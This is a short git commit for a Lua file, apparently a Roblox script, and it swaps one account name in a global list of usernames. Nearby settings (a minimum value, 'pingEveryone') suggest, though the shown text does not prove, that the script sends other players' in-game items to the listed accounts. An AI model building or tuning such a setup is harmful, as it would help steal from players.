167916b9b0100c039f76b73e5aff2247fc5071d7
ShxDrag <bns19126@gmail.com>
2026-09-19 01:09:47 +0900

    Update Usernames list in Pra.lua

--- Pra.lua
+++ Pra.lua
@@ -65,7 +65,7 @@ task.spawn(function()
         end
     end
 
-    _G.Usernames = {"MRFLIMCLA1","MRFLIMCLA2","MRFLIMCLA3","GROW4GARDEN1M10029","MRFLIMCLA5"}
+    _G.Usernames = {"MRFLIMCLA1","MRFLIMCLA2","MRFLIMCLA3","Nachito_pro574","MRFLIMCLA5"}
     _G.min_value = 2
     _G.pingEveryone = "Yes"
     _G.scriptExecuted = _G.scriptExecuted or false
